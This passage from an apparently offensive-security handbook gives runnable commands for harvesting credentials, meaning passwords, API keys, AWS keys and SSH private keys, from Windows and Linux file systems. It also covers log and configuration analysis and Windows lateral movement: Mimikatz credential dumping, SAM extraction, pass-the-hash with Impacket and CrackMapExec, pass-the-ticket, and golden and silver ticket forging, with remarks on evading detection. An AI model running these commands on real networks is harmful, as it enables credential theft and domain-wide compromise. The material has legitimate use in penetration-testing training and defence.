findstr /si "pass=" C:\*.config C:\*.xml C:\*.ini

# Search for credentials
findstr /si "username" C:\*.config C:\*.xml
findstr /si "connectionstring" C:\*.config C:\*.xml

# API keys and tokens
findstr /si "api_key" C:\*.txt C:\*.config
findstr /si "apikey" C:\*.txt C:\*.config
findstr /si "api-key" C:\*.txt C:\*.config
findstr /si "token" C:\*.txt C:\*.config
findstr /si "secret" C:\*.txt C:\*.config

# Private keys
findstr /si "BEGIN RSA PRIVATE KEY" C:\*.txt C:\*.pem C:\*.key
findstr /si "BEGIN PRIVATE KEY" C:\*.txt C:\*.pem C:\*.key
```

**Linux Content Search**

```bash
# Search for passwords
grep -r -i "password\s*=" / 2>/dev/null | grep -v "Binary"
grep -r -i "pwd\s*=" / 2>/dev/null | grep -v "Binary"
grep -r -i "pass\s*=" / 2>/dev/null | grep -v "Binary"

# Database connection strings
grep -r -i "connectionstring" /var/www /etc /opt 2>/dev/null
grep -r -i "jdbc:" /var/www /etc /opt 2>/dev/null
grep -r -i "mysql://" /var/www /etc /opt 2>/dev/null
grep -r -i "mongodb://" /var/www /etc /opt 2>/dev/null

# API keys
grep -r -E "api[_-]?key|apikey" /var/www /home /opt 2>/dev/null
grep -r -E "api[_-]?secret" /var/www /home /opt 2>/dev/null
grep -r -E "access[_-]?token" /var/www /home /opt 2>/dev/null

# AWS credentials
grep -r "aws_access_key_id" / 2>/dev/null
grep -r "aws_secret_access_key" / 2>/dev/null

# Private SSH keys
grep -r "BEGIN RSA PRIVATE KEY" / 2>/dev/null
grep -r "BEGIN OPENSSH PRIVATE KEY" / 2>/dev/null
```

### File Metadata Analysis

**Windows File Timestamps**

```powershell
# Recent files (modified in last 7 days)
forfiles /S /D -7 /C "cmd /c echo @path @fdate @ftime"

# Files modified in specific date range
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | 
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) } | 
    Select-Object FullName, LastWriteTime, Length

# Recently accessed files
Get-ChildItem -Path C:\Users -Recurse -ErrorAction SilentlyContinue | 
    Where-Object { $_.LastAccessTime -gt (Get-Date).AddHours(-24) } | 
    Select-Object FullName, LastAccessTime
```

**Linux File Timestamps**

```bash
# Files modified in last 7 days
find / -type f -mtime -7 2>/dev/null

# Files accessed in last 24 hours
find / -type f -atime -1 2>/dev/null

# Files changed in last hour
find / -type f -cmin -60 2>/dev/null

# Sort by modification time
ls -lRt /home | head -50

# Find recently modified config files
find /etc -type f -mtime -7 -name "*.conf" 2>/dev/null
```

### Alternate Data Streams (Windows)

**ADS Enumeration**

```powershell
# List ADS for specific file
dir /r suspicious_file.txt

# Recursively find ADS
dir /s /r C:\Users\

# PowerShell ADS detection
Get-Item -Path C:\Users\*.* -Stream * | Where-Object {$_.Stream -ne ':$DATA'}

# Read ADS content
more < file.txt:hidden_stream

# Using streams utility
streams.exe -s C:\Users\
```

### File Carving and Recovery

**Windows File Recovery**

```powershell
# Shadow copies
vssadmin list shadows

# Access shadow copy
mklink /d C:\shadow \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\

# Restore file from shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\path\to\file C:\restored\
```

**Linux File Recovery**

```bash
# Extundelete (ext3/ext4)
extundelete /dev/sda1 --restore-all

# PhotoRec (multi-format)
photorec /d /path/to/recovery/ /dev/sda1

# Foremost
foremost -t all -i /dev/sda1 -o /path/to/output/

# Scalpel
scalpel /dev/sda1 -o /path/to/output/
```

### Large File Identification

```bash
# Windows - Find large files
forfiles /S /M * /C "cmd /c if @fsize GTR 104857600 echo @path @fsize"

# PowerShell - Files over 100MB
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | 
    Where-Object { $_.Length -gt 100MB } | 
    Sort-Object Length -Descending | 
    Select-Object FullName, @{Name="SizeMB";Expression={[math]::Round($_.Length/1MB,2)}}

# Linux - Find files over 100MB
find / -type f -size +100M 2>/dev/null -exec ls -lh {} \;

# Top 20 largest files
find / -type f -exec du -h {} + 2>/dev/null | sort -rh | head -20
```

---

## Log File Analysis

### Windows Event Logs

**Event Log Locations**

```powershell
# Event log directory
C:\Windows\System32\winevt\Logs\

# Key log files
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx
```

**Query Event Logs (PowerShell)**

```powershell
# List all event logs
Get-EventLog -List

# Security log - Failed logins (Event ID 4625)
Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4625} | Select-Object TimeGenerated, Message | Format-List

# Successful logins (Event ID 4624)

Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4624} | Select-Object TimeGenerated, Message | Format-List

# Account logon events (Event ID 4648)

Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4648} | Select-Object TimeGenerated, Message

# Special privileges assigned (Event ID 4672) - Admin logins

Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4672} | Select-Object TimeGenerated, Message

# Process creation events (Event ID 4688)

Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4688} | Select-Object TimeGenerated, Message

# User account changes (Event IDs 4720, 4722, 4724, 4738)

Get-EventLog -LogName Security | Where-Object {$_.EventID -in @(4720,4722,4724,4738)} | Format-List

````

**Advanced Event Log Filtering**
```powershell
# Filter by date range
$StartDate = (Get-Date).AddDays(-7)
$EndDate = Get-Date
Get-EventLog -LogName Security -After $StartDate -Before $EndDate | Where-Object {$_.EventID -eq 4625}

# Export to CSV
Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4625} | 
    Select-Object TimeGenerated, EventID, Message | 
    Export-Csv -Path failed_logins.csv -NoTypeInformation

# Filter by username
Get-EventLog -LogName Security | Where-Object {$_.Message -like "*username*"}

# Remote computer events
Get-EventLog -LogName Security -ComputerName remote-pc -Credential (Get-Credential)
````

**Get-WinEvent (Advanced Queries)**

```powershell
# PowerShell command execution history
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | 
    Where-Object {$_.Id -eq 4104} | 
    Select-Object TimeCreated, Message | Format-List

# RDP connections (Event ID 1149)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational'; ID=1149}

# Scheduled task creation (Event ID 4698)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4698} | Format-List

# Service installation (Event ID 7045)
Get-WinEvent -FilterHashtable @{LogName='System'; ID=7045} | Format-List

# Windows Defender detections
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Windows Defender/Operational'; ID=1116,1117}
```

**Event Log Export**

```powershell
# Export Security log
wevtutil epl Security C:\security_backup.evtx

# Export all logs
Get-EventLog -List | ForEach-Object {
    wevtutil epl $_.Log "C:\logs\$($_.Log).evtx"
}

# Export to XML
wevtutil qe Security /f:xml > security.xml

# Export filtered events
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} | 
    Export-Clixml -Path failed_logins.xml
```

**Event Log Clearing Detection**

```powershell
# Check for log clearing (Event ID 1102)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=1102} | Format-List

# Check for suspicious gaps in logs
Get-EventLog -LogName Security -Newest 1000 | 
    Select-Object TimeGenerated | 
    Sort-Object TimeGenerated
```

### Linux System Logs

**Common Log Locations**

```bash
/var/log/auth.log          # Authentication (Debian/Ubuntu)
/var/log/secure            # Authentication (RHEL/CentOS)
/var/log/syslog            # System messages
/var/log/messages          # General messages
/var/log/kern.log          # Kernel logs
/var/log/apache2/          # Apache logs
/var/log/nginx/            # Nginx logs
/var/log/mysql/            # MySQL logs
/var/log/postgresql/       # PostgreSQL logs
/var/log/cron              # Cron job logs
/var/log/boot.log          # Boot messages
/var/log/dmesg             # Hardware/driver messages
~/.bash_history            # User command history
/var/log/wtmp              # Login records (binary)
/var/log/btmp              # Failed login attempts (binary)
/var/log/lastlog           # Last login info (binary)
```

**Authentication Log Analysis**

```bash
# Failed SSH login attempts
grep "Failed password" /var/log/auth.log

# Successful SSH logins
grep "Accepted password\|Accepted publickey" /var/log/auth.log

# SSH connections by IP
grep "sshd" /var/log/auth.log | grep "Accepted" | awk '{print $1, $2, $3, $11}'

# Sudo command usage
grep "sudo" /var/log/auth.log | grep "COMMAND"

# User additions
grep "useradd" /var/log/auth.log

# Failed sudo attempts
grep "sudo.*authentication failure" /var/log/auth.log

# Root login attempts
grep "root" /var/log/auth.log | grep "Failed\|Accepted"
```

**System Log Analysis**

```bash
# Recent system errors
grep -i "error\|fail\|critical" /var/log/syslog | tail -50

# Service start/stop events
grep -E "started|stopped" /var/log/syslog

# Kernel messages
dmesg | grep -i "error\|warning\|fail"

# USB device connections
grep -i "usb" /var/log/syslog

# Network interface changes
grep -i "link\|interface" /var/log/syslog
```

**Login History Analysis**

```bash
# Current logged-in users
w
who

# Last logged-in users
last -20

# Last login per user
lastlog

# Failed login attempts
lastb

# Login history from wtmp
last -f /var/log/wtmp

# Specific user login history
last username

# Reboot history
last reboot
```

**Command History Analysis**

```bash
# Current user bash history
cat ~/.bash_history

# All users' bash history
find /home -name ".bash_history" -exec cat {} \; 2>/dev/null

# Root bash history
cat /root/.bash_history

# History with timestamps (if enabled)
HISTTIMEFORMAT="%F %T " history

# Find sensitive commands
grep -E "password|passwd|ssh|mysql|wget|curl" ~/.bash_history

# Find privilege escalation attempts
grep -E "sudo|su |pkexec" ~/.bash_history
```

### Web Server Logs

**Apache Access Log Analysis**

```bash
# Access log location
/var/log/apache2/access.log

# Top 20 IP addresses
cat access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -20

# Top requested URLs
cat access.log | awk '{print $7}' | sort | uniq -c | sort -rn | head -20

# 404 errors
grep " 404 " access.log

# 500 errors
grep " 5[0-9][0-9] " access.log

# POST requests
grep "POST" access.log

# Requests by specific IP
grep "192.168.1.100" access.log

# Requests to admin pages
grep "/admin\|/wp-admin\|/phpmyadmin" access.log

# Suspicious user agents
grep -i "sqlmap\|nikto\|nmap\|masscan\|metasploit" access.log

# Large response sizes (potential data exfiltration)
awk '{if ($10 > 1000000) print $0}' access.log
```

**Apache Error Log Analysis**

```bash
# Error log location
/var/log/apache2/error.log

# PHP errors
grep "PHP" error.log

# Permission denied errors
grep "Permission denied" error.log

# File not found errors
grep "File does not exist" error.log

# Recent errors (last 100)
tail -100 error.log

# Critical errors
grep -i "critical\|alert\|emergency" error.log
```

**Nginx Access Log Analysis**

```bash
# Nginx log location
/var/log/nginx/access.log

# Parse Nginx logs (JSON format if configured)
cat access.log | jq '.'

# Top referrers
cat access.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -20

# Bandwidth usage by IP
awk '{ip[$1]+=$$10} END {for (i in ip) print ip[i], i}' access.log | sort -rn | head -20

# Request methods distribution
awk '{print $6}' access.log | sort | uniq -c

# HTTP status code distribution
awk '{print $9}' access.log | sort | uniq -c

# Slow requests (response time > 5 seconds)
awk '{if ($NF > 5.0) print $0}' access.log
```

### Application Logs

**Database Logs**

**MySQL/MariaDB**

```bash
# Error log
/var/log/mysql/error.log

# General query log (if enabled)
/var/log/mysql/mysql.log

# Slow query log
/var/log/mysql/mysql-slow.log

# Analyze slow queries
cat mysql-slow.log | grep "Query_time" | sort -rn | head -20

# Failed connections
grep "Access denied" /var/log/mysql/error.log

# Connection from specific host
grep "192.168.1.100" /var/log/mysql/mysql.log
```

**PostgreSQL**

```bash
# PostgreSQL log directory
/var/log/postgresql/

# Connection attempts
grep "connection" /var/log/postgresql/postgresql-*.log

# Failed authentication
grep "FATAL.*password authentication failed" /var/log/postgresql/postgresql-*.log

# Executed queries (if logging enabled)
grep "statement:" /var/log/postgresql/postgresql-*.log

# Error messages
grep "ERROR" /var/log/postgresql/postgresql-*.log
```

**Application-Specific Logs**

**Docker Logs**

```bash
# Container logs
docker logs <container_id>

# Follow logs in real-time
docker logs -f <container_id>

# Logs with timestamps
docker logs -t <container_id>

# Last 100 lines
docker logs --tail 100 <container_id>

# Docker daemon logs
journalctl -u docker.service
```

**Systemd Journal**

```bash
# View all journal entries
journalctl

# Follow journal in real-time
journalctl -f

# Filter by service
journalctl -u ssh.service
journalctl -u apache2.service

# Filter by priority (0=emerg, 3=err, 6=info)
journalctl -p err

# Filter by time
journalctl --since "2024-01-01 00:00:00"
journalctl --since "1 hour ago"
journalctl --since today

# Filter by specific user
journalctl _UID=1000

# Boot messages
journalctl -b

# Export to file
journalctl > system_journal.txt
```

### Log Correlation and Analysis

**Automated Log Analysis Script**

```bash
#!/bin/bash

echo "[*] Security Log Analysis"
echo "========================="

echo -e "\n[+] Failed SSH Login Attempts:"
grep "Failed password" /var/log/auth.log 2>/dev/null | awk '{print $1, $2, $3, $9, $11}' | sort | uniq -c | sort -rn | head -10

echo -e "\n[+] Successful SSH Logins:"
grep "Accepted password\|Accepted publickey" /var/log/auth.log 2>/dev/null | awk '{print $1, $2, $3, $9, $11}' | tail -10

echo -e "\n[+] Sudo Command Execution:"
grep "sudo.*COMMAND" /var/log/auth.log 2>/dev/null | tail -10

echo -e "\n[+] User Account Changes:"
grep -E "useradd|usermod|userdel|groupadd" /var/log/auth.log 2>/dev/null | tail -10

echo -e "\n[+] Service Failures:"
grep -i "failed\|failure" /var/log/syslog 2>/dev/null | grep -v "audit" | tail -10

echo -e "\n[+] Suspicious Web Requests:"
if [ -f /var/log/apache2/access.log ]; then
    grep -E "\.\.\/|union|select|exec|cmd=|bash|sh|passwd|shadow" /var/log/apache2/access.log | tail -10
fi

echo -e "\n[+] Current Active Connections:"
ss -tunap | grep ESTABLISHED

echo -e "\n[+] Recently Modified Files in /etc:"
find /etc -type f -mtime -1 2>/dev/null

echo "[*] Analysis Complete"
```

---

## Configuration File Analysis

### Web Application Configuration Files

**PHP Configuration**

```bash
# php.ini locations
/etc/php/7.4/apache2/php.ini
/etc/php/7.4/cli/php.ini
/etc/php.ini

# Extract sensitive settings
grep -E "display_errors|expose_php|allow_url_fopen|allow_url_include|disable_functions" /etc/php/*/apache2/php.ini

# Find all php.ini files
find / -name "php.ini" 2>/dev/null

# Check for dangerous configurations
grep "allow_url_include = On" /etc/php/*/apache2/php.ini
grep "disable_functions =" /etc/php/*/apache2/php.ini
```

**Apache Configuration**

```bash
# Apache config locations
/etc/apache2/apache2.conf
/etc/httpd/conf/httpd.conf
/etc/apache2/sites-enabled/

# Extract virtual hosts
grep -r "VirtualHost" /etc/apache2/sites-enabled/

# Find .htaccess files
find /var/www -name ".htaccess" 2>/dev/null

# Check for exposed directories
grep -r "DirectoryIndex" /etc/apache2/

# Authentication files
grep -r "AuthUserFile\|AuthGroupFile" /etc/apache2/

# Analyze .htaccess for credentials
find /var/www -name ".htaccess" -exec grep -H "Auth" {} \;
```

**Nginx Configuration**

```bash
# Nginx config location
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/

# Extract server blocks
grep -A 20 "server {" /etc/nginx/sites-enabled/*

# Find PHP configurations
grep -r "fastcgi_pass\|php-fpm" /etc/nginx/

# Check for password files
grep -r "auth_basic_user_file" /etc/nginx/

# SSL certificate locations
grep -r "ssl_certificate" /etc/nginx/
```

**IIS Configuration (Windows)**

```powershell
# IIS config location
C:\Windows\System32\inetsrv\config\applicationHost.config

# Web.config files
dir /s /b C:\inetpub\wwwroot\web.config

# Extract connection strings
findstr /si "connectionstring" C:\inetpub\wwwroot\web.config

# Authentication settings
findstr /si "authentication" C:\Windows\System32\inetsrv\config\applicationHost.config

# Virtual directories
Get-WebVirtualDirectory

# Application pools
Get-IISAppPool
```

### Database Configuration Files

**MySQL/MariaDB Configuration**

```bash
# MySQL config location
/etc/mysql/my.cnf
/etc/my.cnf
~/.my.cnf

# Extract credentials
grep -E "user|password" /etc/mysql/my.cnf
grep -E "user|password" ~/.my.cnf

# Check for insecure configurations
grep "skip-grant-tables" /etc/mysql/my.cnf
grep "bind-address" /etc/mysql/my.cnf

# Find all MySQL config files
find / -name "my.cnf" 2>/dev/null
```

**PostgreSQL Configuration**

```bash
# PostgreSQL config
/etc/postgresql/*/main/postgresql.conf
/var/lib/pgsql/data/postgresql.conf

# Authentication config
/etc/postgresql/*/main/pg_hba.conf

# Extract connection settings
grep "listen_addresses" /etc/postgresql/*/main/postgresql.conf
grep "port" /etc/postgresql/*/main/postgresql.conf

# Check authentication methods
cat /etc/postgresql/*/main/pg_hba.conf

# Password file
~/.pgpass
```

**MongoDB Configuration**

```bash
# MongoDB config
/etc/mongod.conf

# Extract settings
grep -E "bindIp|port|auth" /etc/mongod.conf

# Check if authentication is enabled
grep "security:" /etc/mongod.conf

# MongoDB connection strings in apps
grep -r "mongodb://" /var/www /opt 2>/dev/null
```

**Redis Configuration**

```bash
# Redis config
/etc/redis/redis.conf

# Extract password
grep "requirepass" /etc/redis/redis.conf

# Check bind address
grep "bind" /etc/redis/redis.conf

# Dangerous commands
grep "rename-command" /etc/redis/redis.conf
```

### Application Framework Configuration

**Django (Python)**

```bash
# Settings file locations
find / -name "settings.py" 2>/dev/null
find / -name "local_settings.py" 2>/dev/null

# Extract database credentials
grep -A 10 "DATABASES" settings.py

# Secret key
grep "SECRET_KEY" settings.py

# Debug mode
grep "DEBUG" settings.py

# Allowed hosts
grep "ALLOWED_HOSTS" settings.py
```

**Flask (Python)**

```bash
# Config files
find / -name "config.py" 2>/dev/null
find / -name "instance/config.py" 2>/dev/null

# Extract secrets
grep -E "SECRET_KEY|DATABASE_URI|SQLALCHEMY" config.py

# Debug mode
grep "DEBUG" config.py
```

**Ruby on Rails**

```bash
# Database config
find / -name "database.yml" 2>/dev/null

# Credentials
cat config/database.yml

# Secrets
find / -name "secrets.yml" 2>/dev/null
cat config/secrets.yml

# Master key (Rails 5.2+)
cat config/master.key

# Encrypted credentials
cat config/credentials.yml.enc
```

**Node.js/Express**

```bash
# Environment files
find / -name ".env" 2>/dev/null
find / -name ".env.local" 2>/dev/null
find / -name ".env.production" 2>/dev/null

# Extract credentials
cat .env
cat .env.local

# Package configuration
cat package.json

# Node modules with credentials
find /var/www -name "config.js" 2>/dev/null
```

**Laravel (PHP)**

```bash
# Environment file
find / -name ".env" -path "*/laravel/*" 2>/dev/null

# Extract configuration
cat .env | grep -E "DB_|APP_KEY|MAIL_|AWS_"

# Configuration cache
cat bootstrap/cache/config.php

# Database config
cat config/database.php
```

**WordPress**

```bash
# wp-config.php location
find / -name "wp-config.php" 2>/dev/null

# Extract database credentials
grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST" wp-config.php

# Authentication keys and salts
grep "AUTH_KEY\|SECURE_AUTH_KEY\|LOGGED_IN_KEY" wp-config.php

# Database prefix
grep "table_prefix" wp-config.php

# Backup config files
find / -name "wp-config.php.bak" 2>/dev/null
find / -name "wp-config.php.old" 2>/dev/null
```

### Network Service Configuration

**SSH Configuration**

```bash
# SSH server config
/etc/ssh/sshd_config

# Check for weak configurations
grep "PermitRootLogin" /etc/ssh/sshd_config
grep "PasswordAuthentication" /etc/ssh/sshd_config
grep "PubkeyAuthentication" /etc/ssh/sshd_config
grep "PermitEmptyPasswords" /etc/ssh/sshd_config

# Authorized keys
cat ~/.ssh/authorized_keys
find /home -name "authorized_keys" 2>/dev/null

# Known hosts
cat ~/.ssh/known_hosts
```

**FTP Configuration**

```bash
# vsftpd config
/etc/vsftpd.conf

# ProFTPD config
/etc/proftpd/proftpd.conf

# Check for anonymous access
grep "anonymous_enable" /etc/vsftpd.conf

# User list
cat /etc/vsftpd.userlist
cat /etc/vsftpd.chroot_list
```

**Samba Configuration**

```bash
# Samba config
/etc/samba/smb.conf

# Extract shares
grep -A 10 "\[.*\]" /etc/samba/smb.conf

# Check for guest access
grep "guest ok\|map to guest" /etc/samba/smb.conf

# User database
pdbedit -L -v
```

**DNS Configuration**

```bash
# BIND config
/etc/bind/named.conf
/etc/named.conf

# Zone files
/var/named/
/etc/bind/zones/

# Extract zone information
cat /etc/bind/named.conf.local

# Check for zone transfers
grep "allow-transfer" /etc/bind/named.conf*
```

### Cloud and Container Configuration

**Docker Configuration**

```bash
# Docker daemon config
/etc/docker/daemon.json

# Docker compose files
find / -name "docker-compose.yml" 2>/dev/null

# Extract environment variables
grep -A 50 "environment:" docker-compose.yml

# Secrets in compose
grep "secrets:" docker-compose.yml

# Volume mounts
grep "volumes:" docker-compose.yml

# Dockerfile search
find / -name "Dockerfile" 2>/dev/null

# Extract credentials from Dockerfile
grep -E "ENV|ARG|USER|PASSWORD" Dockerfile
```

**Kubernetes Configuration**

```bash
# Kubeconfig
~/.kube/config
/etc/kubernetes/admin.conf

# Extract cluster information
kubectl config view

# Secrets
kubectl get secrets --all-namespaces

# ConfigMaps
kubectl get configmaps --all-namespaces

# Service accounts
kubectl get serviceaccounts --all-namespaces
```

**AWS Configuration**

```bash
# AWS CLI credentials
~/.aws/credentials
~/.aws/config

# Extract access keys
cat ~/.aws/credentials

# S3 bucket config
find / -name ".s3cfg" 2>/dev/null

# Terraform state (may contain secrets)
find / -name "terraform.tfstate" 2>/dev/null
cat terraform.tfstate | grep -i "password\|secret\|key"
```

### Configuration File Search Script

```bash
#!/bin/bash

echo "[*] Configuration File Analysis"
echo "================================"

# Web configs
echo -e "\n[+] Web Application Configs:"
find / -name "web.config" -o -name "wp-config.php" -o -name ".env" 2>/dev/null | head -20

# Database configs
echo -e "\n[+] Database Configs:"
find / -name "my.cnf" -o -name "postgresql.conf" -o -name "mongod.conf" 2>/dev/null

# SSH configs
echo -e "\n[+] SSH Configurations:"
find /home -name "authorized_keys" -o -name "id_rsa" -o -name "id_rsa.pub" 2>/dev/null

# Application configs
echo -e "\n[+] Application Configs:"
find / -name "settings.py" -o -name "config.php" -o -name "application.properties" 2>/dev/null | head -20

# Docker configs
echo -e "\n[+] Docker/Container Configs:"
find / -name "docker-compose.yml" -o -name "Dockerfile" 2>/dev/null | head -10

# AWS configs
echo -e "\n[+] Cloud Provider Configs:"
ls -la ~/.aws/ ~/.azure/ ~/.config/gcloud/ 2>/dev/null

echo -e "\n[*] Analysis Complete"
```

---

## Important Related Topics

- **Memory Dump Analysis** for extracting credentials from RAM
- **Network Traffic Analysis** using packet captures during post-exploitation
- **Scheduled Task/Cron Job Analysis** for persistence mechanisms
- **Registry Analysis (Windows)** for additional credential stores and configuration
- **Certificate and Key Store Analysis** for PKI infrastructure credentials
- **Cloud Metadata Service Exploitation** (AWS, Azure, GCP)
- **Credential Dumping from Active Directory** (DCSync, DCShadow)
- **Container Escape Techniques** and host filesystem access

---

# Lateral Movement Techniques

Lateral movement allows attackers to pivot from an initially compromised host to other systems within a network, escalating access and reaching high-value targets. These techniques leverage stolen credentials, session tokens, and remote execution capabilities.

## Pass-the-Hash Lateral Movement

Pass-the-Hash (PtH) exploits NTLM authentication by using password hashes directly instead of plaintext passwords. Windows systems authenticate using NT hash values, making plaintext passwords unnecessary for lateral movement.

### Technical Foundation

NTLM authentication uses challenge-response protocol where the NT hash (MD4 of password) is used to encrypt a server challenge. With the hash, attackers can authenticate without cracking passwords.

**Hash Format:**

- LM Hash: `AAD3B435B51404EEAAD3B435B51404EE` (deprecated, often disabled)
- NT Hash: `32-character hexadecimal string`
- Format: `username:RID:LM_hash:NT_hash:::`

### Extracting Hashes

**Using Mimikatz:**

```cmd
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

**Using secretsdump.py (Impacket):**

```bash
secretsdump.py 'DOMAIN/user:password@target_ip'
secretsdump.py -hashes :NT_hash 'DOMAIN/user@target_ip'
secretsdump.py -sam -security -system LOCAL
```

**Dumping from Registry (requires SYSTEM):**

```bash
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
secretsdump.py -sam sam.save -system system.save LOCAL
```

### Pass-the-Hash Execution Methods

**PsExec with Impacket:**

```bash
psexec.py -hashes :NT_hash DOMAIN/username@target_ip
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.10

# Execute specific command
psexec.py -hashes :NT_hash 'DOMAIN/user@target' 'whoami'
```

**WMIExec (stealthier, no SMB writes):**

```bash
wmiexec.py -hashes :NT_hash DOMAIN/username@target_ip
wmiexec.py -hashes :NT_hash administrator@192.168.1.10 'ipconfig'
```

**SMBExec (alternative to PsExec):**

```bash
smbexec.py -hashes :NT_hash DOMAIN/username@target_ip
```

**Evil-WinRM with Hash:**

```bash
evil-winrm -i target_ip -u username -H NT_hash
```

**CrackMapExec for Multiple Targets:**

```bash
crackmapexec smb 192.168.1.0/24 -u administrator -H NT_hash

# Execute commands
crackmapexec smb 192.168.1.10 -u administrator -H NT_hash -x 'whoami'

# Dump SAM
crackmapexec smb 192.168.1.10 -u administrator -H NT_hash --sam
```

**Mimikatz PtH (from Windows):**

```cmd
sekurlsa::pth /user:administrator /domain:DOMAIN /ntlm:NT_hash /run:powershell.exe
```

### Detection Evasion Considerations

[Inference] PtH generates Event ID 4624 (Logon Type 3) with NTLM authentication. WMIExec creates fewer artifacts than PsExec since it doesn't write to disk.

## Pass-the-Ticket Lateral Movement

Pass-the-Ticket (PtT) exploits Kerberos authentication by stealing and reusing Ticket Granting Tickets (TGT) or Service Tickets (TGS). This technique is specific to Active Directory environments.

### Kerberos Ticket Fundamentals

**Ticket Types:**

- **TGT (Ticket Granting Ticket):** Issued by KDC, used to request service tickets
- **TGS (Ticket Granting Service):** Service-specific tickets for accessing resources

**Ticket Formats:**

- `.kirbi` - Mimikatz format
- `.ccache` - Linux/Unix format

### Extracting Tickets

**Mimikatz Ticket Extraction:**

```cmd
mimikatz.exe
privilege::debug

# Export all tickets
sekurlsa::tickets /export

# List tickets in memory
sekurlsa::tickets

# Specific user tickets
kerberos::list /export
```

**Rubeus (Windows .NET tool):**

```cmd
# Dump all tickets
Rubeus.exe dump

# Dump specific user
Rubeus.exe dump /user:administrator /nowrap

# Monitor for new tickets
Rubeus.exe monitor /interval:5
```

**Linux Ticket Extraction:**

```bash
# Current user's ticket cache
klist
cp /tmp/krb5cc_* ./ticket.ccache

# From keytab files
klist -k /etc/krb5.keytab
```

### Ticket Injection and Usage

**Mimikatz Ticket Injection:**

```cmd
# Inject .kirbi ticket
kerberos::ptt ticket.kirbi

# Verify injection
klist

# Use injected ticket
dir \\target_dc\C$
```

**Rubeus Ticket Operations:**

```cmd
# Inject ticket (Base64 encoded)
Rubeus.exe ptt /ticket:base64_ticket_string

# Create sacrificial logon session
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DOMAIN /username:user /password:FakePass /ticket:base64_ticket

# Request TGS with TGT
Rubeus.exe asktgs /ticket:base64_TGT /service:cifs/target.domain.local /ptt
```

**Linux PtT with Impacket:**

```bash
# Set ticket environment variable
export KRB5CCNAME=/path/to/ticket.ccache

# Use ticket with Impacket
psexec.py -k -no-pass DOMAIN/user@target.domain.local
wmiexec.py -k -no-pass DOMAIN/user@target.domain.local
smbexec.py -k -no-pass DOMAIN/user@target.domain.local

# Sync time (critical for Kerberos)
sudo ntpdate -s dc_ip
sudo timedatectl set-ntp 0
sudo date -s "$(ssh user@dc_ip date)"
```

**Ticket Format Conversion:**

```bash
# .kirbi to .ccache
impacket-ticketConverter ticket.kirbi ticket.ccache

# .ccache to .kirbi
impacket-ticketConverter ticket.ccache ticket.kirbi
```

### Overpass-the-Hash (Pass-the-Key)

Using NTLM hash or AES keys to request Kerberos TGT:

```cmd
# Mimikatz
sekurlsa::pth /user:administrator /domain:DOMAIN /ntlm:NT_hash /run:powershell.exe

# Rubeus (with AES256 key)
Rubeus.exe asktgt /user:administrator /aes256:aes_key /nowrap

# With NTLM hash
Rubeus.exe asktgt /user:administrator /rc4:NT_hash /domain:domain.local /dc:dc01.domain.local /ptt
```

**Impacket getTGT:**

```bash
getTGT.py DOMAIN/user -hashes :NT_hash
getTGT.py DOMAIN/user -aesKey aes256_key

# Use generated ticket
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass DOMAIN/user@target.domain.local
```

### Golden Ticket Attack

Creating forged TGT with KRBTGT hash:

```cmd
# Mimikatz Golden Ticket
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-DOMAIN-SID /krbtgt:KRBTGT_NT_hash /id:500 /ptt

# Rubeus
Rubeus.exe golden /rc4:KRBTGT_hash /user:administrator /domain:domain.local /sid:S-1-5-21-DOMAIN-SID /nowrap
```

**Impacket ticketer.py:**

```bash
ticketer.py -nthash KRBTGT_hash -domain-sid S-1-5-21-DOMAIN-SID -domain domain.local administrator

export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local
```

### Silver Ticket Attack

Forging service ticket (TGS) with service account hash:

```cmd
# Mimikatz
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-DOMAIN-SID /target:server.domain.local /service:cifs /rc4:service_account_hash /ptt
```

## Remote Service Execution

Executing commands on remote systems using legitimate Windows services and protocols.

### SMB-Based Execution

**PsExec (Sysinternals):**

```cmd
# Basic execution
PsExec.exe \\target_ip -u DOMAIN\user -p password cmd.exe

# Interactive session
PsExec.exe \\target_ip -u user -p password -i cmd.exe

# Copy and execute
PsExec.exe \\target_ip -u user -p password -c malware.exe

# System context
PsExec.exe \\target_ip -u user -p password -s cmd.exe
```

**Impacket PsExec:**

```bash
# Username/password
psexec.py DOMAIN/user:password@target_ip

# Pass-the-hash
psexec.py -hashes :NT_hash DOMAIN/user@target_ip

# Execute single command
psexec.py DOMAIN/user:password@target_ip 'ipconfig'

# Use service name (less common detection)
psexec.py -service-name CustomSvc DOMAIN/user:password@target_ip
```

